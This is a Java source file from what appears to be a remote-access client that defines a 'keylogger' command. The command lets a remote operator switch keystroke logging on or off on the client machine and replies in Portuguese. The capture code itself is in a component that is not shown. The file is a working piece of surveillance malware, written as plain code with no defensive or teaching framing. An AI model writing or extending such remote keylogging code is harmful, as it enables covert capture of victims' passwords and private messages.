package br.com.introcdc.connect.client.commands.message;
/*
 * Written by IntroCDC, Bruno Coêlho at 16/01/2025 - 03:25
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientKeyLoggerComponents;

public class ClientCommandKeyLogger extends ClientCommand {

    public ClientCommandKeyLogger() {
        super("keylogger");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (ClientKeyLoggerComponents.KEY_LOGGER) {
            ClientKeyLoggerComponents.KEY_LOGGER = false;
            msg("Keylogger desativado!");
        } else {
            ClientKeyLoggerComponents.KEY_LOGGER = true;
            msg("Keylogger ativado!");
        }
    }

}
